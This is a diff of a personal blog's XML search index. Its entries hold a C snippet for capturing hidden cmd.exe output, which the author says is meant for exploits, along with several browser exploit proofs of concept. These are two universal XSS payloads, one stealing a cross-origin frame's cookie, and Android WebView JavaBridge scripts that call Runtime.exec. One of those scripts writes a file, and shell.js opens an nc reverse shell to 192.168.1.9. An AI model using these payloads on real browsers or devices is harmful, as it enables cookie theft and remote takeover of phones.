@@ -110,7 +110,7 @@
   <entry>
     <title><![CDATA[匿名管道读取CMD回显信息]]></title>
     <url>%2Farchives%2FGet_cmd.html</url>
-    <content type="text"><![CDATA[最近改exp的时候用到的，加到exp里面回显执行信息，保存一份~12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define EXE_NAME NULL//TEXT("Cmd.exe")#define EXE_CMD TEXT("Cmd.exe /C ipconfig/all")int main()&#123; char Buffer[4096]; STARTUPINFO sInfo;//新进程的主窗口特性 PROCESS_INFORMATION pInfo; SECURITY_ATTRIBUTES sa; HANDLE hRead, hWrite; DWORD bytesRead; //读取代码的长度 sa.nLength = sizeof(SECURITY_ATTRIBUTES);/ /结构体的大小，可用SIZEOF取得 sa.lpSecurityDescriptor = NULL;//安全描述符 sa.bInheritHandle = TRUE;;/ /安全描述的对象能否被新创建ÆÆ的进程继承 if (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, 0)) //创建匿名管道 &#123; return GetLastError();//返回最近的一个错误，0表示正常 &#125; GetStartupInfo(&amp;sInfo)； sInfo.cb = sizeof(sInfo); sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; sInfo.wShowWindow = SW_HIDE; sInfo.hStdError = hWrite; //将管道的写端交给子进程 sInfo.hStdOutput = hWrite; memset(&amp;pInfo, 0, sizeof(pInfo)); if (!CreateProcess(EXE_NAME, EXE_CMD, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sInfo, &amp;pInfo)) //创建子进程 &#123; CloseHandle(hWrite); CloseHandle(hRead); return GetLastError(); &#125; CloseHandle(hWrite); //关闭父进程的写端 for (int i = 0;; ++i) &#123; if (!ReadFile(hRead, Buffer, sizeof(Buffer) - 1, &amp;bytesRead, NULL)) //读取内容 &#123; break; &#125; Buffer[bytesRead] = 0; printf("%s\n", Buffer); &#125; WaitForSingleObject(pInfo.hProcess, INFINITE);//当等待仍在挂起状态时，句柄被关闭，那么函数行为是未定义的。该句柄必须具有 SYNCHRONIZE 访问权限; CloseHandle(hRead); system("pause"); return 0;&#125; from: http://www.cnblogs.com/onlyac/p/5346478.html]]></content>
+    <content type="text"><![CDATA[最近改exp的时候用到的，加到exp里面回显执行信息，保存一份~12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#include &lt;windows.h&gt;#include &lt;stdio.h&gt;#define EXE_NAME NULL//TEXT("Cmd.exe")#define EXE_CMD TEXT("Cmd.exe /C ipconfig/all")int main()&#123; char Buffer[4096]; STARTUPINFO sInfo;//新进程的主窗口特性 PROCESS_INFORMATION pInfo; SECURITY_ATTRIBUTES sa; HANDLE hRead, hWrite; DWORD bytesRead; //读取代码的长度 sa.nLength = sizeof(SECURITY_ATTRIBUTES); //结构体的大小，可用SIZEOF取得 sa.lpSecurityDescriptor = NULL;//安全描述符 sa.bInheritHandle = TRUE; //安全描述的对象能否被新创建的进程继承 if (!CreatePipe(&amp;hRead, &amp;hWrite, &amp;sa, 0)) //创建匿名管道 &#123; return GetLastError(); //返回最近的一个错误，0表示正常 &#125; GetStartupInfo(&amp;sInfo); sInfo.cb = sizeof(sInfo); sInfo.dwFlags = STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES; sInfo.wShowWindow = SW_HIDE; sInfo.hStdError = hWrite; //将管道的写端交给子进程 sInfo.hStdOutput = hWrite; memset(&amp;pInfo, 0, sizeof(pInfo)); if (!CreateProcess(EXE_NAME, EXE_CMD, NULL, NULL, TRUE, 0, NULL, NULL, &amp;sInfo, &amp;pInfo)) //创建子进程 &#123; CloseHandle(hWrite); CloseHandle(hRead); return GetLastError(); &#125; CloseHandle(hWrite); //关闭父进程的写端 for (int i = 0;; ++i) &#123; if (!ReadFile(hRead, Buffer, sizeof(Buffer) - 1, &amp;bytesRead, NULL)) //读取内容 &#123; break; &#125; Buffer[bytesRead] = 0; printf("%s\n", Buffer); &#125; WaitForSingleObject(pInfo.hProcess, INFINITE);//当等待仍在挂起状态时，句柄被关闭，那么函数行为是未定义的。该句柄必须具有 SYNCHRONIZE 访问权限; CloseHandle(hRead); system("pause"); return 0;&#125; from: http://www.cnblogs.com/onlyac/p/5346478.html]]></content>
       <categories>
         <category>随便写写</category>
       </categories>
@@ -1119,11 +1119,6 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
-    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
-  </entry>
-  <entry>
-    <title></title>
     <url>%2Ftools%2Fuxss%2Fpoc2.html</url>
     <content type="text"><![CDATA[i = document.body.appendChild(document.createElement("iframe")); i.src = "http://m.baidu.com"; i.onload = function() { document.documentURI = "javascript://hostname.com/%0D%0Aalert('OH HAI ' + location)"; i.contentWindow.location = ""; } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
@@ -1134,12 +1129,17 @@
   </entry>
   <entry>
     <title></title>
-    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
-    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
+    <url>%2Ftools%2Fuxss%2Fpoc1.html</url>
+    <content type="text"><![CDATA[frame = document.body.appendChild(document.createElement("iframe")); frame.src = "http://m.baidu.com/"; frame.onload = function() { Function("}, (builtins = this), function() {"); originalInstantiate = builtins.Instantiate; builtins.DefineOneShotAccessor(builtins, "Instantiate", function() {}); flag = 0; template = null; builtins.Instantiate = function(x, y) { if (flag) { doc = frame.contentWindow.document; alert(doc.cookie); flag = 0; } else if (!template) template = x; return originalInstantiate(x, y); }; document.implementation; flag = 1; builtins.ConfigureTemplateInstance(frame.contentWindow, template); } L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"log":false,"model":{"jsonPath":"/live2dw/assets/z16.model.json"},"display":{"position":"left","width":80,"height":120,"hOffset":30,"vOffset":0},"mobile":{"show":true}});]]></content>
   </entry>
   <entry>
     <title></title>
     <url>%2Ftools%2Fwebviewpoc%2Fwrite.js</url>
     <content type="text"><![CDATA[function execute(cmdArgs) { return searchBoxJavaBridge_.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } try{ execute(["/system/bin/sh","-c","echo 'Hello world' > /sdcard/goot.txt"]); }catch(e){ alert(e); }]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>%2Ftools%2Fwebviewpoc%2Fshell.js</url>
+    <content type="text"><![CDATA[function execute(cmdArgs) { return XXX.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec(cmdArgs); } execute(["/system/bin/sh","-c","nc 192.168.1.9 8088|/system/bin/sh|nc 192.168.1.9 9999"]); alert("ok3");]]></content>
   </entry>
 </search>
